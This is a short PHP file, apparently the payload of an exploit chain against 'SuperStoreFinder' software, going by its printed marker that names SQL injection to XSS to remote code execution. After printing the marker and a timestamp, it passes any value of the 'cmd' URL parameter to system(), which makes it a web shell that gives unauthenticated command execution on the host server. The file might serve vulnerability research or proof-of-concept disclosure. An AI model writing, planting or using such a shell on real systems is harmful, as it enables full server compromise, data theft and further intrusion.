<?php

echo "Xib3rR4dAr_SuperStoreFinder_SQLi_to_XSS_to_RCE\n";

echo time()."\n";

if( isset($_GET['cmd']) && !empty($_GET['cmd']) ){

    system($_GET['cmd']);

}

?>